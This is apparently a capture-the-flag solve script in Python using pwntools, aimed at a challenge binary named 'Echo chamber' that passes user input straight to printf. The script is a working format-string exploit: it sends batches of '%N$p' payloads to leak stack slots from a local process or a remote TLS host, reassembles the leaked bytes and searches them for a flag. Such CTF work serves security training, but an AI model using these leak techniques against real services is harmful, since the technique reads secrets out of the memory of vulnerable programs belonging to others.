#!/usr/bin/env python3
# Echo chamber -- printf(input) with attacker-controlled format string.
# flag[128] and input[128] are both locals of main, so the flag bytes are
# already sitting on the stack that printf walks as its varargs.
# Slots 6+ come off the stack; the flag starts at %22$p on this binary.
#   usage: ./solve.py                       (local, needs a /flag.txt)
#          ./solve.py host:1337             (remote, TLS)
import re, sys
from pwn import *

context.log_level = 'warn'

if len(sys.argv) > 1 and ':' in sys.argv[1]:
    host, port = sys.argv[1].rsplit(':', 1)
    io = remote(host, int(port), ssl=True, timeout=10)
else:
    io = process('./pwn_echo-chamber/handout/echo-chamber')

leaked = {}

# Only 16 printf calls, and fgets caps input at 127 chars -- sweep slots 6..45
# in chunks rather than one slot per round.
for lo in range(6, 46, 13):
    slots = list(range(lo, min(lo + 13, 46)))
    payload = "".join(f"%{i}$p." for i in slots)
    assert len(payload) < 127
    io.recvuntil(b'> ')
    io.sendline(payload.encode())
    for i, tok in zip(slots, io.recvline().decode(errors='replace').strip().split('.')):
        tok = tok.strip()
        if tok.startswith('0x'):
            leaked[i] = int(tok, 16)
        elif tok == '(nil)':
            leaked[i] = 0

blob = b"".join(leaked.get(i, 0).to_bytes(8, 'little') for i in sorted(leaked))
m = re.search(rb'NNS\{[ -~]*?\}', blob)
print(m.group().decode() if m else f"no flag found; blob={blob!r}")
